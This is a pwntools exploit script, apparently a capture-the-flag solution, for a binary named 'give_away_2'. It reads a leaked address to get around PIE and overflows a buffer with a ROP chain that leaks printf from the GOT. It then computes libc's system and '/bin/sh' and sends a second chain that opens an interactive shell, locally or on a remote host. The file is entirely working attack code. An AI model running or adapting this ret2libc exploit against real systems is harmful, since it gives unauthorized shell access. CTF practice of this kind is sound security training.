#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './give_away_2'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = './libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info

# elf, libc

# rop1
ru('Give away: ')
main = eval(rc(14))
info_addr('main',main)
text = main - 0x000864
info_addr('text',text)
printf = text + 0x880
printf_got = text + 0x200fc0

bssbase = elf.bss()+0x800 + text
# gadget
prdi = 0x0000000000000903 + text # pop rdi ; ret
prsi_r15 = 0x0000000000000901 + text
fget_leave = 0x879 + text

offset = 40-8
payload = 'A'*offset
payload += p64(bssbase)
payload += p64(prdi) + p64(printf_got) + p64(printf)

rc()
sl(payload)
printf_libc = uu64(rc(6))
info_addr('printf_libc',printf_libc)
libcbase = printf_libc - libc.sym['printf']
info_addr('libcbase',libcbase)
system = libcbase + libc.sym['system']
info_addr('system',system)
binsh  = libcbase + libc.search('/bin/sh').next()
info_addr('binsh',binsh)

offset = 40-8
pl2 = 'A'*offset
pl2 += p64(bssbase)
pl2 += p64(prdi+1) + p64(prdi) + p64(binsh) + p64(system)
# debug()
sl(pl2)
# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()

